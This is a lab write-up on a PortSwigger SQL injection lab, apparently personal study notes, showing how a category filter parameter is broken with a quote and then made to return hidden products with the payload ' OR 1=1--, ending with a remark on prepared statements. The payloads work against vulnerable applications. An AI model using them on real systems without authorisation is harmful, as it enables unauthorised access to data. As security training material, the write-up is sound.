#  SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

# 🧪 SQL Injection - Category Filter Lab (PortSwigger)

> 💡 These notes are based on the **category filter SQL injection** lab, solved with the help of Rana Khalil's tutorial.

---

## 🔍 Introduction

The URL structure of the application is as follows:

```
/filter?category=Pets
```

To test if the parameter is vulnerable to SQL injection, we try appending a single quote (`'`) character:

```
/filter?category='
```

**Result:** We get an `Internal Server Error`.

➡️ This error indicates that the query in the backend breaks, and the parameter can be manipulated using SQL characters.

---

## 🧠 What Happens in the Backend?

The normal query might look something like this:

```sql
SELECT * FROM products WHERE category = 'Pets' AND released = 1
```

When we inject a single quote (`'`), the query becomes:

```sql
SELECT * FROM products WHERE category = ''' AND released = 1
```

This breaks the SQL syntax and causes an error.

---

## ✅ Vulnerability Confirmed

From this behavior, we can confirm that the application is vulnerable to SQL injection.

---

## 🔧 Our Goal: Dump All Products

Let's start with a simple payload:

```
/filter?category='-- 
```

This payload transforms the query into:

```sql
SELECT * FROM products WHERE category = ''--' AND released = 1
```

This returns no results because the condition `category = ''` doesn't match any record.

---

## 🎯 Working Payload

Our goal is to manipulate the query logic to always return `TRUE`. We can use `OR 1=1` for this:

```
/filter?category=' OR 1=1-- 
```

The resulting query:

```sql
SELECT * FROM products WHERE category = '' OR 1=1--' AND released = 1
```

➡️ Since `OR 1=1` always evaluates to `TRUE`, this returns **all products**, regardless of whether they are released or not.

---

## 🧬 Summary

| Step | Action | Result |
|------|--------|--------|
| Add `'` | `/filter?category='` | Internal Server Error (vulnerable) |
| Add comment `--` | `/filter?category='--` | No results (category condition fails) |
| Use `OR 1=1` | `/filter?category=' OR 1=1--` | All products returned |

---

## 🛡️ Note

This type of attack is possible due to **unsanitized user input**. In real-world applications, such vulnerabilities can be prevented by using **prepared statements** or **ORMs**.
